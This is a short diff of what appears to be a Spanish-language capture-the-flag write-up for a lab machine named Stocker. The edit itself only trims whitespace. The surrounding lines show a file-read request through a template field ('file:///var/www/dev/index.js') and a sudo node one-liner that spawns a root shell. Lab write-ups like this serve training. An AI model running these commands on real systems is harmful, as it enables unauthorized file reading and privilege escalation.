@@ -28,7 +28,7 @@ curl -s -X POST http://dev.stocker.htb/login -H "Content-Type: application/json"
 curl -s -X POST http://dev.stocker.htb/api/order -d '{"template":"file:///var/www/dev/index.js"}'
 # Sudo node
 sudo -l
-sudo node -e 'require("child_process").spawn("/bin/sh",{stdio:"inherit"})' 
+sudo node -e 'require("child_process").spawn("/bin/sh",{stdio:"inherit"})'
 ```
 
 ## Enumeración
